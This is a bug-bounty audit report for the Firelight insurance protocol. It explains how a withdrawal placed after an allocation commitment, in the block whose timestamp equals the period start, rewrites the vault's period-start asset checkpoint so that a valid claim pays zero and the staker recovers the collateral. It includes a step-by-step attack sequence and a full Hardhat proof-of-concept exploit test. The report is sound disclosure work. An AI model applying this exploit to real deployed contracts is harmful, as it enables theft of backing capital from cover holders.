# 88572 sc high a same block boundary withdrawal can mutate committed period start backing and leave settled cover insolvent

**Submitted on Aug 13th 2026 at 21:31:42 UTC by @go4ko for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88572
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

`CoverOrderAllocator.commitAllocation` validates a period's matching capacity against `vault.totalAssetsAt(currentPeriodStart())`. However, that historical value is not immutable during a block whose timestamp is exactly the period start. A staker can hold capital before the boundary and have an ordinary withdrawal execute immediately after the allocator's commitment in that boundary block. The withdrawal writes a total-assets checkpoint at the same timestamp used by the commitment, changing subsequent `totalAssetsAt(periodStart)` lookups even though the commitment has already succeeded.

Settlement trusts the capacity stored in the commitment and does not revalidate the vault snapshot. The order can therefore settle and its premium can be collected against the original capacity, while `FirelightVault.payout` later rereads the changed period-start snapshot and caps the corresponding vault payout at zero. The withdrawing staker can claim all of the collateral after the payout window.

The fully end-to-end PoC demonstrates a minimal 1:1 case with no First-Loss Buffer contribution: 100 assets support 100 USD of committed and settled cover, the period-start snapshot is changed from 100 to zero after commitment, the real `IncidentManager` validates and approves a legitimate 100 USD assessment against that settled cover, the resulting 100-asset vault payout transfers zero, and the staker later claims all 100 assets.

## Vulnerability Details

Capacity validation reads the vault's total-assets checkpoint at the current period's inclusive start timestamp:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

`commitAllocation` performs this validation once and then stores the caller-supplied matching capacity:

```solidity
_validateMatchingCapacity($, currentPeriod, matchingCapacity, totalAllocated);

AllocationCommitment storage commit = $.allocationCommitments[currentPeriod];
commit.root = merkleRoot;
commit.totalAvailableCapacity = matchingCapacity;
commit.totalDeclaredAllocated = totalAllocated;
```

The issue is that `totalAssetsAt(periodStart)` is not frozen after this read. A withdrawal records the reduced active-asset total using the executing block's timestamp:

```solidity
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

```solidity
function _logTrace(
    address owner,
    uint256 balance,
    uint256 _totalSupply,
    uint256 _totalAssets,
    bool isLogAssets
) private {
    uint48 ts = Time.timestamp();
    _traceBalanceOf[owner].push(ts, balance);
    _traceTotalSupply.push(ts, _totalSupply);

    if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
}
```

`Trace256.push` accepts that boundary timestamp as a checkpoint key. It appends the boundary value when the last key is older and replaces the stored value when the last key is identical:

```solidity
(bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();

uint256 len = self._values.length;
uint256 lastValue = latest(self);
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

Because `upperLookupRecent` returns the latest checkpoint whose key is **less than or equal to** the requested timestamp, a checkpoint written later in transaction order with key `periodStart` changes the result of the exact historical query that already authorized the commitment:

```solidity
function upperLookupRecent(Trace256 storage self, uint48 key) internal view returns (uint256) {
    uint208 idx = self._trace.upperLookupRecent(key);
    return idx > 0 ? self._values[idx] : 0;
}
```

Settlement verifies the Merkle proof and accounts against `commit.totalAvailableCapacity` and `commit.totalDeclaredAllocated`; it does not recompute or bind the cover to the now-current value of `totalAssetsAt(periodStart)`. As a result, the affected order still settles, the premium is transferred to the premium collector, and the Cover NFT is minted.

The normal assessment path accepts the settled order. `IncidentManager.addAssessmentLosses` reads its period and allocation from the real allocator, requires the loss not to exceed the allocation, and requires the order and incident periods to match:

```solidity
(uint256 orderPeriod, uint256 allocatedCoverAmount, address payoutRecipient) = $
    .coverOrderAllocator
    .getCoverOrderMarketInfo(coverTokenId, marketId);
if (payoutRecipient == address(0)) revert OrderNotFound(coverTokenId, marketId);
if (amount > allocatedCoverAmount) {
    revert AssessmentLossAmountTooBig(coverTokenId, marketId, allocatedCoverAmount, amount);
}
uint256 incidentPeriod = incident.period;
if (orderPeriod != incidentPeriod) revert InvalidOrderPeriod(coverTokenId, orderPeriod, incidentPeriod);
```

After the assessment is submitted, `approveCurrentAssessment` executes the actual payout waterfall through `_executePayout`, which calls the vault:

```solidity
if (vaultRequestedAmount > 0) {
    vaultPaidAmount = $.vault.payout(receiver, vaultRequestedAmount, captureTimestamp);
}
```

When an approved incident is paid, `FirelightVault.payout` independently rereads the mutable period-start lookup and uses it as a hard cap:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();

uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Although the attacker's 100 assets remain physically inside the vault as an exposed pending withdrawal and are included in `activePayableAmount`, the changed `assetsAtCapturePeriod == 0` value forces `paidAmount` to zero. Because payout processing is allowed to continue when `paidAmount == 0`, none of the pending withdrawal is consumed. The staker can claim it after the withdrawal delay.

The state transition is:

| Stage                                       | `totalAssetsAt(S)` |             Commitment / obligation |       Attacker's assets |
| ------------------------------------------- | -----------------: | ----------------------------------: | ----------------------: |
| Before period boundary `S`                  |                100 |                                None |              100 active |
| Commitment executes first at timestamp `S`  |                100 |                 100 cover committed |              100 active |
| Withdrawal executes later in the same block |                  0 |         100 cover remains committed |             100 pending |
| Order settles                               |                  0 | 100 cover active; premium collected |             100 pending |
| Real incident assessment is approved        |                  0 |          100 claim; 0 paid by vault |             100 pending |
| Withdrawal becomes claimable                |                  0 |             Claim remains underpaid | 100 claimed by attacker |

### Attack Sequence

1. The attacker deposits or otherwise acquires vault shares before period `P` begins. The attacker does not need to deposit at the boundary.
2. A cover order requesting 100 USD of cover is pending for period `P`.
3. A Flare block is produced with timestamp exactly equal to period `P`'s start, `S`.
4. The allocator's ordinary `commitAllocation` transaction executes first. `_computeAvailableCapacity` observes the attacker's 100 active assets through `totalAssetsAt(S)`, so a 100 USD matching capacity and declared aggregate allocation are accepted.
5. The attacker's ordinary `withdraw(100, attacker, attacker)` transaction executes later in the same block. Because all transactions in the block observe timestamp `S`, `_logTrace` records zero active assets at key `S` and the withdrawal is placed into the delayed-withdrawal bucket.
6. `totalAssetsAt(S)` now returns zero, but the existing commitment still records 100 USD of available capacity and declared allocation.
7. After the settlement grace period, the allocator follows the normal protocol flow and settles the order. Settlement collects the premium and mints cover for 100 USD without revalidating the vault backing.
8. The normal incident workflow creates and confirms an incident in period `P`, adds a 100 USD assessment loss against the settled Cover NFT and its market, and submits the assessment. The real allocator confirms that the cover is settled for period `P` with a 100 USD allocation.
9. The assessment approver calls `approveCurrentAssessment`. `IncidentManager._executePayout` converts the approved loss into a 100-asset vault request and calls `FirelightVault.payout`.
10. `payout` rereads `totalAssetsAt(S) == 0`, transfers zero, and leaves all 100 pending-withdrawal assets untouched. `IncidentManager` records `vaultRequestedAmount = 100`, `vaultPaidAmount = 0`, and closes the valid incident normally.
11. Once the payout window and withdrawal delay expire, the attacker calls `claimWithdraw` and receives all 100 assets.

The allocator, settlement operator, assessor, and payout role do not need to behave maliciously. They perform their documented functions with valid inputs. The only adversarial action is the staker's permissionless withdrawal and its ordering after the commitment.

### Why the ordering is feasible

The vulnerable Phase 2 system is intended for Flare Mainnet. Flare is EVM-compatible, has approximately 1.8-second blocks, and lets the block proposer determine transaction ordering under a default priority-gas auction. Consequently, two transactions in one block can execute in the required commit-then-withdraw order while observing the same `block.timestamp`. [Flare network documentation](https://dev.flare.network/network/overview)

The timing condition is narrow and should be stated precisely: the commitment must land in a block whose timestamp equals the exact period boundary, and the withdrawal must execute after it. This is not guaranteed for every boundary or for every ordinary RPC submission, but neither the contracts nor Flare's ordering rules prohibit this execution order, and it does not require compromising any Firelight role.

This path also contradicts the protocol documentation. Firelight states that period settlement is “deterministic with respect to the period start timestamp” and explains that deployments and withdrawals submitted after a period begins only affect the next period's capacity calculation. Here, a withdrawal after the commitment changes both the already-validated current-period backing and the later payout cap. [Firelight: Periods and Coverage Cycles](https://docs.firelight.finance/core-concepts/periods-and-coverage-cycles)

### Known-Issue Distinction

This is distinct from the disclosed First-Loss Buffer trust assumption. The attacker does not control or drain the external First-Loss Buffer wallet; the PoC uses no First-Loss Buffer balance and removes ordinary vault capital through the vault's intended delayed-withdrawal path.

It is also distinct from the disclosed absence of an aggregate on-chain claims cap. The fully end-to-end PoC uses one settled cover and one correctly sized assessment loss. The real `IncidentManager` validates the loss against the real allocator's settled market allocation before the ordinary approver executes it. No assessor approves duplicate or excessive claims, and no privileged participant makes an incorrect business decision.

The supplied Macro audit discusses checkpointing direct reward transfers and separately discusses deterministic off-chain matching, but it does not identify a boundary-timestamp vault checkpoint changing after capacity commitment. The same mechanism was not found in the program's supplied known issues or previous public Firelight reports.

## Impact Details

The appropriate in-scope impact is **Critical - Protocol insolvency**.

The protocol sells active cover and collects a premium based on capital that the payout path subsequently treats as nonexistent. An attacker can move their otherwise slashable active capital into the delayed-withdrawal bucket after it has been counted for current-period allocation, prevent that capital from being consumed by a valid claim through the zero historical cap, and recover it in full after the payout window. The cover holder or payout beneficiary is left with an unpaid covered loss.

The demonstrated loss is complete: 100 assets support 100 USD of settled cover, but a valid 100-asset payout transfers zero while the attacker recovers all 100 assets. More generally, the amount of vault backing removable through this execution path is limited by the attacker's vault position and the cover allocated against that position. Leverage can make the resulting outstanding cover obligation larger than the escaped vault principal.

This is a solvency failure => the mutated lookup is used by the state-changing payout path to determine how much collateral can be transferred, and settlement has already created the corresponding cover obligation.

## Recommended Remediation

Freeze an immutable total-assets snapshot for each period before any transaction at the new period timestamp can mutate active assets. Both capacity commitment and incident payout must consume the same frozen value.

An alternative is to define period-start backing as the last checkpoint strictly before the period-start second and use that same strict-before rule everywhere. For example, both `_computeAvailableCapacity` and `payout` could query the snapshot corresponding to `periodStart - 1`, with explicit handling for the initial epoch. The important invariant is:

```
Once capacity for period P has been committed, no later transaction can change the
vault-assets value used either to settle P's cover or to cap payouts for P.
```

Add regression tests covering deposits, withdrawals, transfers, reward checkpoints, and payouts in the exact boundary block, including multiple writes sharing the boundary timestamp.

## References

* [`CoverOrderAllocator.commitAllocation`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L357)
* [`CoverOrderAllocator._settleCoverOrder`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L457-L539)
* [`CoverOrderAllocator._computeAvailableCapacity`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L725)
* [`IncidentManager.addAssessmentLosses`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L291-L369)
* [`IncidentManager.approveCurrentAssessment`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L402-L439)
* [`IncidentManager._executePayout`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L621-L706)
* [`FirelightVault.withdraw`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L746-L778)
* [`FirelightVault.payout`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L874-L966)
* [`FirelightVault._logTrace`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056)
* [`Checkpoints.Trace256`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L193-L224)
* [Firelight: Periods and Coverage Cycles](https://docs.firelight.finance/core-concepts/periods-and-coverage-cycles)
* [Flare network documentation](https://dev.flare.network/network/overview)
* [Previous public Firelight reports](https://reports.immunefi.com/firelight)

## Proof of Concept

## Proof of Concept

Please create `test/poc_issue1_same_second_checkpoint.js` with the following contents. This is a fully end-to-end protocol PoC: it deploys the real upgradeable `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. Mocks are limited to external token and oracle dependencies.

The PoC creates and settles real cover, executes the boundary-block back-run, then performs the complete incident lifecycle: `createIncident` → `confirmIncident` → `addAssessmentLosses` → `submitCurrentAssessment` → `approveCurrentAssessment` → `IncidentManager._executePayout` → `FirelightVault.payout`. It never calls `FirelightVault.payout` directly. Finally, it advances beyond the payout window and proves that the attacker claims all of the collateral that backed the settled cover.

Run:

```bash
npx hardhat test test/poc_issue1_same_second_checkpoint.js
```

Code:

```js
const { time } = require('@nomicfoundation/hardhat-network-helpers')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')
const { expect } = require('chai')
const { ethers, network, upgrades } = require('hardhat')

const { deployVault } = require('./setup/fixtures.js')

describe('E2E PoC: boundary-block checkpoint mutation erases committed backing', function () {
  it('settles cover, approves a real incident, pays zero, then lets the staker claim all 100', async function () {
    const ctx = await deployVault({
      decimals: 6,
      initial_deposit_limit: ethers.parseUnits('1000000', 6),
      period_configuration_duration: 7 * 24 * 60 * 60
    })

    const { deployer, firelight_vault: vault, token_contract: vaultAsset } = ctx
    const [staker, buyer, allocatorRole] = ctx.users
    const firstLossBuffer = ctx.rescuer
    const premiumCollector = ctx.limit_updater
    // These signers have no direct INCIDENT_ROLE/PAYOUT_ROLE on the vault. Their
    // only relevant permissions are their normal roles on IncidentManager.
    const incidentCurator = ctx.blocklister
    const assessmentApprover = ctx.pauser

    const deposit = ethers.parseUnits('100', 6)
    const cover = ethers.parseUnits('100', 18)

    await ctx.utils.mintAndApprove(deposit, staker)
    await vault.connect(staker).deposit(deposit, staker.address)

    const MockERC20 = await ethers.getContractFactory('MockERC20')
    const premiumToken = await MockERC20.deploy('Mock USD', 'mUSD', 6)

    const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
    const priceFeed = await MockAggregator.deploy(18, ethers.parseUnits('1', 18))

    const CoverNFT = await ethers.getContractFactory('CoverNFT')
    const coverNFT = await upgrades.deployProxy(
      CoverNFT,
      ['Firelight Cover', 'FLCOVER', '', deployer.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
      { kind: 'transparent' }
    )

    const chainId = 1
    const protocol = 'Morpho'
    const market = ethers.encodeBytes32String('market-A')
    const marketId = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(['uint64', 'string', 'bytes32'], [chainId, protocol, market])
    )

    const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
    const allocator = await upgrades.deployProxy(
      Allocator,
      [{
        vault: await vault.getAddress(),
        premiumCollector: premiumCollector.address,
        coverNFT: await coverNFT.getAddress(),
        priceFeedAdapter: await priceFeed.getAddress(),
        maxPriceAge: 30 * 24 * 60 * 60,
        premiumTokens: [await premiumToken.getAddress()],
        admin: deployer.address,
        adminRole: deployer.address,
        curatorRole: deployer.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: deployer.address,
        initialProtocolConcentrations: [{
          chainId,
          protocol,
          maxProtocolConcentrationBps: 10_000
        }],
        newMarkets: [{ chainId, protocol, market }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: await premiumToken.getAddress(),
          firstLossBuffer: firstLossBuffer.address,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0
        }
      }],
      {
        kind: 'transparent',
        unsafeAllow: ['missing-initializer-call']
      }
    )

    await coverNFT.connect(deployer).grantRole(await coverNFT.MINTER_ROLE(), await allocator.getAddress())

    // Deploy and wire the real incident/payout coordinator. From this point the PoC
    // uses the complete production path; it never calls vault.payout directly.
    const IncidentManager = await ethers.getContractFactory('IncidentManager')
    const incidentManager = await upgrades.deployProxy(
      IncidentManager,
      [
        deployer.address,
        incidentCurator.address,
        assessmentApprover.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        deployer.address,
        ctx.payout_receiver.address,
        await allocator.getAddress(),
        await priceFeed.getAddress(),
        30 * 24 * 60 * 60
      ],
      {
        kind: 'transparent',
        unsafeAllow: ['missing-initializer-call']
      }
    )

    await vault.connect(deployer).grantRole(await vault.INCIDENT_ROLE(), await incidentManager.getAddress())
    await vault.connect(deployer).grantRole(await vault.PAYOUT_ROLE(), await incidentManager.getAddress())
    expect(await vault.hasRole(await vault.INCIDENT_ROLE(), await incidentManager.getAddress())).to.equal(true)
    expect(await vault.hasRole(await vault.PAYOUT_ROLE(), await incidentManager.getAddress())).to.equal(true)
    expect(await vault.hasRole(await vault.INCIDENT_ROLE(), incidentCurator.address)).to.equal(false)
    expect(await vault.hasRole(await vault.PAYOUT_ROLE(), assessmentApprover.address)).to.equal(false)

    // The cover order is prepared in period 0 for period 1. The staker's 100 assets
    // are already present before the boundary, so both the matcher and allocator can
    // legitimately use them as period-1 backing.
    await premiumToken.mint(buyer.address, ethers.parseUnits('10', 6))
    await premiumToken.connect(buyer).approve(await allocator.getAddress(), ethers.MaxUint256)
    await allocator.connect(deployer).createCoverOrder(
      buyer.address,
      buyer.address,
      buyer.address,
      await premiumToken.getAddress(),
      [{ marketId, coverRateAnnual: 500, coverAmount: cover }],
      0
    )

    const tree = StandardMerkleTree.of(
      [[0n, [[marketId, cover]]]],
      ['uint256', '(bytes32,uint256)[]']
    )

    const boundary = await vault.currentPeriodEnd()
    let commitTx
    let withdrawTx

    expect(await vault.totalAssetsAt(boundary)).to.equal(deposit)

    // Model a proposer-valid back-run: the allocator's normal commit and the
    // staker's ordinary withdrawal execute in that order in the boundary block.
    // Every transaction in the block therefore has timestamp == period start.
    await network.provider.send('evm_setAutomine', [false])
    try {
      await network.provider.send('evm_setNextBlockTimestamp', [Number(boundary)])
      commitTx = await allocator.connect(allocatorRole).commitAllocation(
        1,
        tree.root,
        cover,
        cover,
        { gasLimit: 5_000_000, gasPrice: ethers.parseUnits('3', 'gwei') }
      )
      withdrawTx = await vault.connect(staker).withdraw(
        deposit,
        staker.address,
        staker.address,
        { gasLimit: 5_000_000, gasPrice: ethers.parseUnits('2', 'gwei') }
      )
      await network.provider.send('evm_mine')
    } finally {
      await network.provider.send('evm_setAutomine', [true])
    }

    const commitReceipt = await commitTx.wait()
    const withdrawReceipt = await withdrawTx.wait()
    expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber)
    expect(commitReceipt.index).to.be.lessThan(withdrawReceipt.index)
    expect((await ethers.provider.getBlock(commitReceipt.blockNumber)).timestamp).to.equal(Number(boundary))

    // At commit execution the period-start lookup returns 100, so 100 of cover is accepted.
    const commitment = await allocator.getAllocationCommitment(1)
    expect(commitment.totalAvailableCapacity).to.equal(cover)

    // The later withdrawal inserts a checkpoint at the inclusive period-start key
    // (or would replace one if that key already existed), retroactively changing the
    // exact lookup used above from 100 to zero.
    expect(await vault.totalAssetsAt(boundary)).to.equal(0)
    expect(await vault.withdrawAssets(2)).to.equal(deposit)

    // Settlement does not recompute capacity, so the cover becomes active despite
    // its recorded vault backing having disappeared.
    const collectorBalanceBefore = await premiumToken.balanceOf(premiumCollector.address)
    await allocator.connect(allocatorRole).settleCoverOrder(
      0,
      [{ marketId, allocatedCover: cover }],
      tree.getProof(0)
    )
    expect((await allocator.getCoverOrder(0)).allocatedCoverAmount).to.equal(cover)
    expect(await coverNFT.ownerOf(0)).to.equal(buyer.address)
    expect(await premiumToken.balanceOf(premiumCollector.address)).to.be.greaterThan(collectorBalanceBefore)

    // Exercise the entire real incident lifecycle against the settled cover. The
    // assessment is valid, exactly equals the order's allocation, and targets the
    // correct cover period and market.
    const captureTimestamp = boundary + 1n
    await incidentManager.connect(incidentCurator).createIncident(
      captureTimestamp,
      'Valid covered loss',
      ethers.id('incident-1')
    )
    await incidentManager.connect(incidentCurator).confirmIncident(1, 'ipfs://valid-incident-report')
    await incidentManager.connect(incidentCurator).addAssessmentLosses(1, [{
      coverTokenId: 0,
      marketId,
      amount: cover
    }])
    await incidentManager.connect(incidentCurator).submitCurrentAssessment(1)

    // Approval calls IncidentManager._executePayout -> FirelightVault.payout. The
    // rewritten period-start cap makes the real vault pay zero, yet the assessment
    // and incident close normally and the pending withdrawal remains untouched.
    await expect(
      incidentManager.connect(assessmentApprover).approveCurrentAssessment(1)
    )
      .to.emit(vault, 'PayoutExecuted')
      .withArgs(ctx.payout_receiver.address, deposit, 0, captureTimestamp)
      .and.to.emit(incidentManager, 'IncidentPayoutExecuted')
      .withArgs(
        1,
        1,
        1,
        1,
        ctx.payout_receiver.address,
        firstLossBuffer.address,
        await premiumToken.getAddress(),
        0,
        cover,
        deposit,
        0
      )
      .and.to.emit(incidentManager, 'IncidentClosed')
      .withArgs(1, 0, cover)

    const [incident] = await incidentManager.getIncident(1)
    expect(incident.status).to.equal(4) // CLOSED
    expect(incident.vaultPaidAmount).to.equal(0)
    expect(await vaultAsset.balanceOf(ctx.payout_receiver.address)).to.equal(0)
    expect(await vault.withdrawAssets(2)).to.equal(deposit)

    // After the payout window, the attacker claims every asset that had backed the
    // now-settled cover commitment.
    const duration = BigInt(ctx.config.period_configuration_duration)
    await time.increaseTo(boundary + 2n * duration + 1n)
    await expect(vault.connect(staker).claimWithdraw(2))
      .to.emit(vault, 'CompleteWithdraw')
      .withArgs(staker.address, deposit, 2)
    expect(await vaultAsset.balanceOf(staker.address)).to.equal(deposit)
  })
})
```

Expected result:

```
  E2E PoC: boundary-block checkpoint mutation erases committed backing
    ✔ settles cover, approves a real incident, pays zero, then lets the staker claim all 100

  1 passing
```
